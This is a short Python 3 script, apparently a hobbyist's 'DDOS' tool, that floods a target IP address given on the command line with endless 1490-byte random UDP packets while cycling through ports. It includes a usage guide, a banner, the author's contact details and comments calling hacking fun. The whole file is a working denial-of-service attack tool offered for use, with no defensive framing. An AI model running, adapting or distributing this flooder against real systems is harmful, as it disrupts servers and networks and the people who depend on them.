###########################################Let's Start##############################################
#!/usr/bin/python3
########################################Import Modules##############################################
import socket
import os
import sys
import random
import time
#########################################User Menual################################################
uses = "Python3 DDOS.py Target_Ip Port"
guide = "Example:\nPython3 DDOS.py 100.100.100.100 80\n1>Python3\n2>DDOS.py\n3>100.100.100.100 = Target Ip Address\n4>80 = Port No\n5>Hit Enter"
if(len(sys.argv)!= 3):
    print(uses)
    print(guide)
    sys.exit()
###############################################Target Ip And Port Input From Run Point######################
target = sys.argv[1]
port = int(sys.argv[2])
###################################Conection Creat####################################################
connections = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
rant = random._urandom(1490)
os.system("clear")
###############################Banner#######################################################
os.system("figlet DDOS ATTACK")
print('*'*80)
####################################Creator Imformation#####################################################
name = 'Name: Shawon'
gitl = 'GitHub: https://github.com/shawon-mj'
facebook = 'Facebook: https://www.facebook.com/shakhawat.shawon.3133'
email = 'Email: mdshawon29@yahoo.com'
print("{}\n{}\n{}\n{}".format(name,gitl,facebook,email))

################################ DONT TAKE SERIOUS...HACKING IS FUN#####TRY AT YOUR OWN RISK########################
#################################Attack Conformation###################################
take_confarmation = input("Do You Want To Start Attack On {} Sevrver?(y = Yes # n = No)".format(target))
up = take_confarmation.upper()
if(up != 'Y'):
    sys.exit()
time.sleep(2)
os.system('clear')
###########################Count Down############################################
count = 0
for i in range(1,6):
    count = count + 1
    print("************Attacking Start On: {}".format(target))
    print('*******************## '+str(count)+' ##**********************')
    time.sleep(1.2)
    os.system('clear')
print("Attack>>>>>>>>>>>>>>>")
time.sleep(1)
s_send = 0
###########################Attack#########################################################
while True:
    connections.sendto(rant,(target,port))
    s_send = s_send + 1
    port = port + 1
    print("Sending {} Packets To {} By Port No {}".format(s_send,target,port))
    if(port == 65534):
        port = 1
#########################################HACKING IS FUN################################################################
